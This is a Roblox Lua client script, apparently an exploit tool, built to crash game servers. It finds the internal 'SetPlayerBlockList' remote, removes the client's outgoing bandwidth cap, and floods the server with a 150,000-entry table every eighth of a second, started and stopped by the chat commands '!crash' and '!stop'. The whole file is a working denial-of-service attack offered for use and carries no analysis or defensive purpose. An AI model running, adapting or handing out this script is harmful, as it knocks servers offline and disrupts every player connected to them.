--!nonstrict
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

-- ═══════════ EXACT SAME VALUES AS ORIGINAL ═══════════
local Children       = 150000
local NestedPerChild = 0
local FieldsPerChild = 0
local FireBurst      = 1
local FrameDelay     = 0.125
local FieldSize      = 0
local RebuildEach    = false

local state = {
    running = false,
    thread  = nil,
    remote  = nil,
    cache   = nil,
    pad     = "",
    fires   = 0,
}

local function resolve()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
        return r
    end
    return nil
end

state.remote = resolve()
print("[CRASH] remote on load:", state.remote and state.remote:GetFullName() or "NOT FOUND")

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""

local function build()
    local root = table.create(Children)
    for i = 1, Children do
        local entry = { id = i, v = i * 2 }
        for k = 1, FieldsPerChild do
            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
        end
        for j = 1, NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    local payload
    if RebuildEach or not state.cache then
        payload = build()
        if not RebuildEach then state.cache = payload end
    else
        payload = state.cache
    end
    for _ = 1, FireBurst do
        state.remote:FireServer(payload)
    end
    state.fires = state.fires + 1
end

local function start()
    if state.running then return end
    state.running = true
    state.cache = nil
    state.fires = 0
    print("[CRASH] STARTING — building payload...")
    state.thread = task.spawn(function()
        while state.running do
            local ok, err = pcall(fire)
            if not ok then
                print("[CRASH] fire error:", err)
            end
            if FrameDelay > 0 then
                task.wait(FrameDelay)
            else
                RunService.Heartbeat:Wait()
            end
        end
    end)
end

local function stop()
    if not state.running then return end
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.cache = nil
    print("[CRASH] STOPPED — total fires:", state.fires)
end

-- ═══════════ DEBUG PRINT EVERY 5s ═══════════
task.spawn(function()
    local last = 0
    while true do
        task.wait(5)
        if state.running then
            print(string.format("[CRASH] fires=%d (+%d/5s) remote=%s",
                state.fires, state.fires - last,
                state.remote and "ok" or "MISSING"))
            last = state.fires
        else
            last = 0
        end
    end
end)

-- ═══════════ CHAT COMMANDS ═══════════
local started = false

local function onMessage(msg)
    local m = tostring(msg or ""):lower():gsub("^%s+", ""):gsub("%s+$", "")
    print("[CRASH] chat received:", m)
    if m == "!crash" then
        if not started then
            started = true
            pcall(start)
        end
    elseif m == "!stop" then
        if started then
            started = false
            pcall(stop)
        end
    end
end

pcall(function() player.Chatted:Connect(onMessage) end)
pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        if not message.TextSource then return end
        if message.TextSource.UserId ~= player.UserId then return end
        onMessage(message.Text)
    end)
end)

print("[CRASH] ready — type !crash in chat")
